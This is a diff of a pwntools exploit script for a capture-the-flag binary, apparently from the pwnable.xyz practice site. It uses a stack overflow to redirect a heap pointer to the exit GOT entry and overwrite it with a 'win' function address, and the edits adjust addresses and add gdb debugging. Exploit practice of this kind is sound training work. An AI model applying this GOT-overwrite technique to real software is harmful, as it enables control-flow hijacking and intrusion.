@@ -1,21 +1,26 @@
 from pwn import *
 
-context.terminal = ['xterm', '-e']
 r = process('./challenge')
-# r = remote("svc.pwnable.xyz" , 30011)
+#r = remote("svc.pwnable.xyz" , 30011)
 
 r.sendlineafter("> ", "1")
 
 r.sendlineafter(": ", "a")
 r.sendlineafter(": ", "1")
+""" gdb.attach(r) """
 r.sendlineafter("> ", "3")
 r.sendlineafter(": ", "b")
 
-exit_got = 0x004007c0
+exit_got = 0x00602070
 win = 0x00400b71
 r.sendlineafter(": ", b"A" * 0x10 + p64(exit_got)) # overflow the value on the stack which represents the malloc pointer 
+""" r.sendlineafter(": ", "A" * 0x10 + "B" * 4) """
+""" gdb.attach(r) """
 r.sendafter("> ", "3")
-r.sendlineafter(": ", p64(win))
-l = r.sendline(": ", "c")
+r.sendafter(": ", p64(win))
+""" gdb.attach(r) """
+l = r.sendlineafter(": ", "c")
+gdb.attach(r)
 l = r.interactive()
+
 
